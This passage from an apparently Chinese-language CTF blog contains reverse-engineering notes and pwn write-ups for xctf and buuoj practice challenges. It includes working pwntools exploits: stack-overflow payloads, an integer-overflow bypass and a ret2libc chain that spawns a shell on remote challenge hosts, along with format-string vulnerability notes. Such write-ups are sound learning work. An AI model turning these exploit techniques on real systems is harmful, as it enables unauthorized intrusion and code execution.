class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs tcl">.text:<span class="hljs-number">080485</span>F4 lol             <span class="hljs-keyword">proc</span><span class="hljs-title"> near</span>               ;<span class="hljs-title"> CODE</span> XREF:<span class="hljs-title"> main+EE↓p</span><br>.text:080485F4                                         ;<span class="hljs-title"> DATA</span> XREF:<span class="hljs-title"> main+AC↓o</span><br>.text:080485F4<br>.text:080485F4<span class="hljs-title"> var_13</span>          =<span class="hljs-title"> byte</span> ptr -13h<br>.text:080485F4<span class="hljs-title"> var_12</span>          =<span class="hljs-title"> byte</span> ptr -12h<br>.text:080485F4<span class="hljs-title"> var_11</span>          =<span class="hljs-title"> byte</span> ptr -11h<br>.text:080485F4<span class="hljs-title"> var_10</span>          =<span class="hljs-title"> byte</span> ptr -10h<br>.text:080485F4<span class="hljs-title"> var_F</span>           =<span class="hljs-title"> byte</span> ptr -0Fh<br>.text:080485F4<span class="hljs-title"> var_E</span>           =<span class="hljs-title"> byte</span> ptr -0Eh<br>.text:080485F4<span class="hljs-title"> var_D</span>           =<span class="hljs-title"> byte</span> ptr -0Dh<br>.text:080485F4<span class="hljs-title"> var_C</span>           =<span class="hljs-title"> dword</span> ptr -0Ch<br>.text:080485F4<span class="hljs-title"> arg_0</span>           =<span class="hljs-title"> dword</span> ptr  8<br>.text:080485F4<br>.text:080485F4<span class="hljs-title">                 push</span> <span class="hljs-title">   ebp</span><br>.text:080485F5<span class="hljs-title">                 mov</span> <span class="hljs-title">    ebp,</span> esp<br>.text:080485F7<span class="hljs-title">                 sub</span> <span class="hljs-title">    esp,</span> 28h<br>.text:080485FA<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]   //给定基地址<br>.text:080485FD<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 1   //基地址位置+1<br>.text:08048600<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]  //将地址的值赋给eax<br>.text:08048603<span class="hljs-title">                 mov</span> <span class="hljs-title">    edx,</span> eax //将值保存<br>.text:08048605<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]  //重复刚才的动作<br>.text:08048608<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 1<br>.text:0804860B<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:0804860E<span class="hljs-title">                 lea</span> <span class="hljs-title">    eax,</span> [edx+eax]  //将两次保存的值赋值给eax ，相当于乘以2<br>.text:08048611<span class="hljs-title">                 mov</span>     [ebp+var_13],<span class="hljs-title"> al</span> //将保存的eax值赋值给ebp+var_13的地址上 <br>               可以得到[eax+var_13]=2*[eax+arg_0+1]<br>.text:08048614<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0] <br>.text:08048617<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 4<br>.text:0804861A<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:0804861D<span class="hljs-title">                 mov</span> <span class="hljs-title">    edx,</span> eax<br>.text:0804861F<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:08048622<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 5<br>.text:08048625<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:08048628<span class="hljs-title">                 lea</span> <span class="hljs-title">    eax,</span> [edx+eax]<br>.text:0804862B<span class="hljs-title">                 mov</span>     [ebp+var_12],<span class="hljs-title"> al</span><br>               [ebp+var_12]=[eax+arg_0+4]+[eax+arg_0+5]<br>.text:0804862E<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:08048631<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 8<br>.text:08048634<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:08048637<span class="hljs-title">                 mov</span> <span class="hljs-title">    edx,</span> eax<br>.text:08048639<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:0804863C<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 9<br>.text:0804863F<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:08048642<span class="hljs-title">                 lea</span> <span class="hljs-title">    eax,</span> [edx+eax]<br>.text:08048645<span class="hljs-title">                 mov</span>     [ebp+var_11],<span class="hljs-title"> al</span><br>               [ebp+var_11]=[eax+arg_0+8]+[eax+arg_0+9]<br>.text:08048648<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:0804864B<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 0Ch<br>.text:0804864E<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:08048651<span class="hljs-title">                 mov</span> <span class="hljs-title">    edx,</span> eax<br>.text:08048653<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:08048656<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 0Ch<br>.text:08048659<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:0804865C<span class="hljs-title">                 lea</span> <span class="hljs-title">    eax,</span> [edx+eax]<br>.text:0804865F<span class="hljs-title">                 mov</span>     [ebp+var_10],<span class="hljs-title"> al</span><br>                [ebp+var_10]=2*[eax+arg_0+12]<br>.text:08048662<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:08048665<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 12h<br>.text:08048668<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:0804866B<span class="hljs-title">                 mov</span> <span class="hljs-title">    edx,</span> eax<br>.text:0804866D<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:08048670<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 11h<br>.text:08048673<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:08048676<span class="hljs-title">                 lea</span> <span class="hljs-title">    eax,</span> [edx+eax]<br>.text:08048679<span class="hljs-title">                 mov</span>     [ebp+var_F],<span class="hljs-title"> al</span><br>                [ebp+var_15]=[eax+arg_0+17]+[eax+arg_0+18]<br>.text:0804867C<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:0804867F<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 0Ah<br>.text:08048682<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:08048685<span class="hljs-title">                 mov</span> <span class="hljs-title">    edx,</span> eax<br>.text:08048687<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:0804868A<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 15h<br>.text:0804868D<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:08048690<span class="hljs-title">                 lea</span> <span class="hljs-title">    eax,</span> [edx+eax]<br>.text:08048693<span class="hljs-title">                 mov</span>     [ebp+var_E],<span class="hljs-title"> al</span><br>                [ebp+var_14]=[eax+arg_0+10]+[eax+arg_0+21]<br>.text:08048696<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:08048699<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 9<br>.text:0804869C<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:0804869F<span class="hljs-title">                 mov</span> <span class="hljs-title">    edx,</span> eax<br>.text:080486A1<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> [ebp+arg_0]<br>.text:080486A4<span class="hljs-title">                 add</span> <span class="hljs-title">    eax,</span> 19h<br>.text:080486A7<span class="hljs-title">                 movzx</span> <span class="hljs-title">  eax,</span> byte<span class="hljs-title"> ptr</span> [eax]<br>.text:080486AA<span class="hljs-title">                 lea</span> <span class="hljs-title">    eax,</span> [edx+eax]<br>.text:080486AD<span class="hljs-title">                 mov</span>     [ebp+var_D],<span class="hljs-title"> al</span><br>             [ebp+var_13]=[eax+arg_0+9]+[eax+arg_0+25]<br>.text:080486B0<span class="hljs-title">                 mov</span>     [ebp+var_C], 0<br>            [ebp+var_12]=0<br>.text:080486B7<span class="hljs-title">                 cmp</span>     [ebp+var_C], 1<br>.text:080486BB<span class="hljs-title">                 jnz</span> <span class="hljs-title">    short</span> loc_80486D3<br>.text:080486BD<span class="hljs-title">                 mov</span> <span class="hljs-title">    eax,</span> offset<span class="hljs-title"> format</span> ; &quot;%s&quot;<br>.text:080486C2<span class="hljs-title">                 lea</span> <span class="hljs-title">    edx,</span> [ebp+var_13]<br>.text:080486C5<span class="hljs-title">                 mov</span>     [esp+4],<span class="hljs-title"> edx</span><br>.text:080486C9<span class="hljs-title">                 mov</span>     [esp],<span class="hljs-title"> eax</span>      ;<span class="hljs-title"> format</span><br>.text:080486CC<span class="hljs-title">                 call</span> <span class="hljs-title">   _printf</span><br>.text:080486D1<span class="hljs-title">                 jmp</span> <span class="hljs-title">    short</span> locret_80486E0<br></code></pre></td></tr></table></figure><p>整理出来得到</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[eax+var_19]</span>=2*<span class="hljs-comment">[eax+arg_0+1]</span><br><span class="hljs-comment">[ebp+var_18]</span>=<span class="hljs-comment">[eax+arg_0+4]</span>+<span class="hljs-comment">[eax+arg_0+5]</span><br><span class="hljs-comment">[ebp+var_17]</span>=<span class="hljs-comment">[eax+arg_0+8]</span>+<span class="hljs-comment">[eax+arg_0+9]</span><br><span class="hljs-comment">[ebp+var_16]</span>=2*<span class="hljs-comment">[eax+arg_0+12]</span><br><span class="hljs-comment">[ebp+var_15]</span>=<span class="hljs-comment">[eax+arg_0+17]</span>+<span class="hljs-comment">[eax+arg_0+18]</span><br><span class="hljs-comment">[ebp+var_14]</span>=<span class="hljs-comment">[eax+arg_0+10]</span>+<span class="hljs-comment">[eax+arg_0+21]</span><br><span class="hljs-comment">[ebp+var_13]</span>=<span class="hljs-comment">[eax+arg_0+9]</span>+<span class="hljs-comment">[eax+arg_0+25]</span><br><span class="hljs-comment">[ebp+var_12]</span>=0<br></code></pre></td></tr></table></figure><p>只要找到传进来的eax+arg_0是谁就可以解除这道题，有下标25的数组，只能猜测是buf或者是pipe[1],先尝试pipe[1]，我先尝试了下按照左边的地址大小找flag写脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-string">&#x27;69800876143568214356928753&#x27;</span><br>a = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">ord</span>,a))<br>flag = <span class="hljs-string">&quot;&quot;</span><br>flag += <span class="hljs-built_in">chr</span>(a[<span class="hljs-number">9</span>]+a[<span class="hljs-number">25</span>])<br>flag += <span class="hljs-built_in">chr</span>(a[<span class="hljs-number">10</span>]+a[<span class="hljs-number">21</span>])<br>flag += <span class="hljs-built_in">chr</span>(a[<span class="hljs-number">17</span>]+a[<span class="hljs-number">18</span>])<br>flag += <span class="hljs-built_in">chr</span>(<span class="hljs-number">2</span>*a[<span class="hljs-number">12</span>])<br>flag += <span class="hljs-built_in">chr</span>(a[<span class="hljs-number">8</span>]+a[<span class="hljs-number">9</span>])<br>flag += <span class="hljs-built_in">chr</span>(a[<span class="hljs-number">4</span>]+a[<span class="hljs-number">5</span>])<br>flag += <span class="hljs-built_in">chr</span>(<span class="hljs-number">2</span>*a[<span class="hljs-number">1</span>])<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#得到值gehlehr，输入后发现不对。</span><br></code></pre></td></tr></table></figure><p>又尝试了下反着输入，得到了flag</p><p>有没有哪位同志可以解释下linux下gdb调试怎么才可以结束输入wwww,以后还是尝试用ida调试elf文件吧qaq</p><h1 id="xctf-pwn-level0"><a href="#xctf-pwn-level0" class="headerlink" title="xctf pwn level0"></a>xctf pwn level0</h1><p>第一次做pwn题，题目就是简单的栈溢出，当允许写入的量超过了堆栈的就可以覆盖返回地址，从而让地址回到自己想要的地方</p><p><img src="https://s2.loli.net/2022/04/02/wJp4kgStd3HlcBX.png" alt="屏幕截图 2022-04-02 124518"></p><p><img src="https://s2.loli.net/2022/04/08/tbx24PnNFO6qLk1.png" alt="屏幕截图 2022-04-02 124528"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;111.200.241.222&quot;</span>,<span class="hljs-number">58857</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">136</span>+p64(<span class="hljs-number">0x0040059A</span>)<br>a.send(payload)<br>a.interactive()<br></code></pre></td></tr></table></figure><h1 id="xctf-pwn-level2"><a href="#xctf-pwn-level2" class="headerlink" title="xctf pwn level2"></a>xctf pwn level2</h1><p><img src="https://s2.loli.net/2022/04/08/skNXIUP6cgSW9AF.png" alt="屏幕截图 2022-03-24 231138"></p><p><img src="https://s2.loli.net/2022/04/08/6TVIYjS1ux45F3W.png" alt="屏幕截图 2022-03-24 231201"></p><p><img src="https://s2.loli.net/2022/04/08/1VJxmnqko7TzNt9.png" alt="屏幕截图 2022-03-24 231313"></p><p><img src="https://s2.loli.net/2022/04/08/JcIK8yeQ3vjE4SA.png" alt="屏幕截图 2022-03-24 231725"></p><h1 id="xctf-pwn-guess-number"><a href="#xctf-pwn-guess-number" class="headerlink" title="xctf pwn guess_number"></a>xctf pwn guess_number</h1><p>gets(&amp;)漏洞，加上伪随机数。伪随机数的一个特点就是，只要我们将种子固定，那么它生成的随机数就是固定的。于是我们只要覆盖随机种子将它改成我们想要的种子即可，正好程序的v7数组的栈地址就在种子的上面。</p><p><img src="https://s2.loli.net/2022/04/08/CsomKFtd4eMz6V9.png" alt="屏幕截图 2022-04-02 124944"></p><p><img src="https://s2.loli.net/2022/04/08/xbpOwuJalKd3DCz.png" alt="屏幕截图 2022-04-02 125028"></p><p><img src="https://s2.loli.net/2022/04/08/jxW46YmVycpAnLf.png" alt="屏幕截图 2022-03-24 232138"></p><p><img src="https://s2.loli.net/2022/04/08/Ul1AuB53oJdmnEP.png" alt="屏幕截图 2022-03-24 232155"></p><p><img src="https://s2.loli.net/2022/04/08/l2MWxZ5DurAQhOY.png" alt="屏幕截图 2022-03-24 232208"></p><h1 id="buuoj-pwn-ciscn-2019-n-1"><a href="#buuoj-pwn-ciscn-2019-n-1" class="headerlink" title="buuoj pwn ciscn_2019_n_1"></a>buuoj pwn ciscn_2019_n_1</h1><p><img src="https://s2.loli.net/2022/04/08/2KrZBMJloS5ezQI.png" alt="屏幕截图 2022-03-27 162049"></p><p>这道题很简单，利用gets函数可以无限输入的漏洞，把v1的栈溢出到v2，将v2的值改成题目要求的值，但我这里犯了个错误，我最开始的时候是想直接把v1,v2的栈直接溢出，然后覆盖原有的地址，直接返回到调用system(“cat \flag”)的地址执行，结果写exp执行后一直timeout，后来才想到把把v1的栈溢出改v2的值。</p><p>要想让v2的值等于11.825，要先找到11.825的16进制值，因为11.825在内存中是以16进制形式存储的。找到后就可以直接写exp了。</p><p>![屏幕截图 2022-03-27 162817](E:\屏幕截图\屏幕截图 2022-03-27 162817.png)</p><p>![屏幕截图 2022-03-27 162832](E:\屏幕截图\屏幕截图 2022-03-27 162832.png) </p><h1 id="jarvisoj-level0-buuoj-pwn"><a href="#jarvisoj-level0-buuoj-pwn" class="headerlink" title="jarvisoj_level0 buuoj pwn"></a>jarvisoj_level0 buuoj pwn</h1><p>基础的栈溢出问题，打开关键函数发现，可以写入的量超过了栈，于是可以覆盖返回地址</p><p><img src="https://s2.loli.net/2022/04/08/xYinmkDd4MwXVPb.png" alt="屏幕截图 2022-03-28 135327"></p><p><img src="https://s2.loli.net/2022/04/08/24RceGXmS7b8dys.png" alt="屏幕截图 2022-03-28 135343"></p><h1 id="xctf-int-overflow"><a href="#xctf-int-overflow" class="headerlink" title="xctf int overflow"></a>xctf int overflow</h1><p>这题看题目就知道可以利用int的溢出，当数据超过int型的最大范围时，就会溢出变为负数的最大值</p><p><img src="https://s2.loli.net/2022/04/08/3caQN7M6dX4Fk2A.png" alt="屏幕截图 2022-04-02 130558"></p><p><img src="https://s2.loli.net/2022/04/08/HJZBaVd5sx97CyX.png" alt="屏幕截图 2022-04-02 130548"></p><p><img src="https://s2.loli.net/2022/04/08/dfZuW9NerCSDO3L.png" alt="屏幕截图 2022-04-02 130539"></p><p><img src="https://s2.loli.net/2022/04/08/odzHA1EOWvgXUrF.png" alt="屏幕截图 2022-04-02 130858"></p><p>于是我们只要将buf的长度更改为258-266之间，并且在buf的前面把dest的栈溢出即可</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-number">54577</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>a.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Please input your username:&quot;</span>)<br>a.sendline(<span class="hljs-string">b&#x27;123&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Please input your passwd:&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">24</span>+p32(<span class="hljs-number">0x08048694</span>)<br>a.sendline(payload.ljust(<span class="hljs-number">260</span>,<span class="hljs-string">b&#x27;a&#x27;</span>))<br>a.interactive()<br></code></pre></td></tr></table></figure><h1 id="buuoj-ciscn-2019-c-1"><a href="#buuoj-ciscn-2019-c-1" class="headerlink" title="buuoj ciscn_2019_c_1"></a>buuoj ciscn_2019_c_1</h1><p>checksec后发现是标准的ret2libc题目，但是这个程序是64位的，在构造payload获得puts的地址方式有差别</p><p>64位：覆盖栈+.got+.plt+main的地址</p><p>32位：覆盖栈+.plt+main的地址+.got</p><p>然后此题的环境还是ubuntu18，Ubuntu18以上后在构造栈溢出后需要堆栈平衡，就必须引入pop_rdi_ret</p><p><img src="https://s2.loli.net/2022/04/08/i9RMjdFw1O7Uyeh.png" alt="1"></p><p><img src="https://s2.loli.net/2022/04/08/m2YQHTCEdygw5bi.png" alt="2"></p><p>于是就可以写payload了，但是我的exp卡在了puts_addr&#x3D;u64(a.recv(7)[:-1].ljust(8,b’\x00’))这里，看了别人的exp才知道在这前面还要再吃个回车，我也不知道为啥，是因为puts(s)?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26328</span>)<br>elf=ELF(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br>puts_plt=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got=elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>main_addr=<span class="hljs-number">0x00400B28</span><br>pop_rdi_ret=<span class="hljs-number">0x400c83</span><br>a.recvuntil(<span class="hljs-string">&quot;Input your choice!&quot;</span>)<br>a.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>)<br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x08</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)<span class="hljs-comment">#unbuntu有堆栈平衡，需要加pop_rdi_ret，之前一直payload构造不上去</span><br>a.sendline(payload1)<br>a.recvuntil(<span class="hljs-string">&quot;Ciphertext\n&quot;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<span class="hljs-comment">#卡在这里了wwww,最后这里还是看了wp</span><br>puts_addr=u64(a.recv(<span class="hljs-number">7</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libcbase=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>system_addr=libcbase+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh_addr=libcbase+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Input your choice!&quot;</span>)<br>a.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>)<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x50</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x08</span>+p64(<span class="hljs-number">0x00400C1C</span>)+p64(pop_rdi_ret)+p64(bin_sh_addr)+p64(system_addr)<br>a.sendline(payload2)<br>a.interactive()<br></code></pre></td></tr></table></figure><h1 id="xctf-pwn-cgfsb"><a href="#xctf-pwn-cgfsb" class="headerlink" title="xctf pwn cgfsb"></a>xctf pwn cgfsb</h1><p>本题利用的是格式化字符串的漏洞来进行解题</p><p>相关知识：</p><blockquote><p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.1_format_string.html">3.1.1 格式化字符串漏洞 · CTF All In One (gitbooks.io)</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/#_9">Format String - CTF Wiki (ctf-wiki.org)</a></p><p><strong>要点</strong>：</p><ol><li><p>根据 cdecl 的调用约定，在进入 <code>printf()</code> 函数之前，将参数从右到左依次压栈。进入 <code>printf()</code> 之后，函数首先获取第一个参数，一次读取一个字符。如果字符不是 <code>%</code>，字符直接复制到输出中。否则，读取下一个非空字符，获取相应的参数并解析输出。（注意：<code>% d</code> 和 <code>%d</code> 是一样的）</p></li><li><p>在进入 printf 之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p></li></ol><ul><li>当前字符不是 %，直接输出到相应标准输出。</li><li>当前字符是 %， 继续读取下一个字符<ul><li>如果没有字符，报错</li><li>如果下一个字符是 %, 输出 %</li><li>否则根据相应的字符，获取相应的参数，对其进行解析并输出</li></ul></li></ul><p> 那么假设，此时我们在编写程序时候，写成了下面的样子</p> <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&gt;<span class="hljs-keyword">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);<br></code></pre></td></tr></table></figure><p> 此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p><ol><li><p>解析其地址对应的字符串</p></li><li><p>解析其内容对应的整形值</p></li><li><p>解析其内容对应的浮点值</p></li><li><pre><code class="c"> //源码 #include&lt;stdio.h&gt; void main() &#123; char format[128]; int arg1 = 1, arg2 = 0x88888888, arg3 = -1; char arg4[10] = &quot;ABCD&quot;; scanf(&quot;%s&quot;, format); printf(format, arg1, arg2, arg3, arg4); printf(&quot;\n&quot;); &#125;  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure> <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">[------------------------------------stack-------------------------------------]<br>0000| 0xffffd550 --&gt; 0xffffd584 (&quot;AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;)<br>0004| 0xffffd554 --&gt; 0x1<br>0008| 0xffffd558 --&gt; 0x88888888<br>0012| 0xffffd55c --&gt; 0xffffffff<br>0016| 0xffffd560 --&gt; 0xffffd57a (&quot;ABCD&quot;)<br>0020| 0xffffd564 --&gt; 0xffffd584 (&quot;AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;)<br>0024| 0xffffd568 (&quot; RUV\327UUVT\332\377\367\001&quot;)<br>0028| 0xffffd56c --&gt; 0x565555d7 (&lt;main+26&gt;:     add    ebx,0x1a29)<br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>0x56555642 in main ()<br></code></pre></td></tr></table></figure></code></pre></li></ol><p> 格式字符串的地址在 <code>0xffffd584</code>，从下面的输出中可以看到它们在栈中是怎样排布的：</p> <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">&gt;gdb-peda$ x/20w $esp<br>&gt;0xffffd550:     0xffffd584      0x00000001      0x88888888      0xffffffff<br>&gt;0xffffd560:     0xffffd57a      0xffffd584      0x56555220      0x565555d7<br>&gt;0xffffd570:     0xf7ffda54      0x00000001      0x424135d0      0x00004443<br>&gt;0xffffd580:     0x00000000      0x41414141      0x2e70252e      0x252e7025<br>&gt;0xffffd590:     0x70252e70      0x2e70252e      0x252e7025      0x70252e70<br>&gt;gdb-peda$ x/20wb 0xffffd584<br>&gt;0xffffd584:     0x41    0x41    0x41    0x41    0x2e    0x25    0x70    0x2e<br>&gt;0xffffd58c:     0x25    0x70    0x2e    0x25    0x70    0x2e    0x25    0x70<br>&gt;0xffffd594:     0x2e    0x25    0x70    0x2e<br>&gt;gdb-peda$ python print(&#x27;\x2e\x25\x70&#x27;)<br>&gt;.%p<br></code></pre></td></tr></table></figure><p> 下面是程序运行的结果：</p> <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 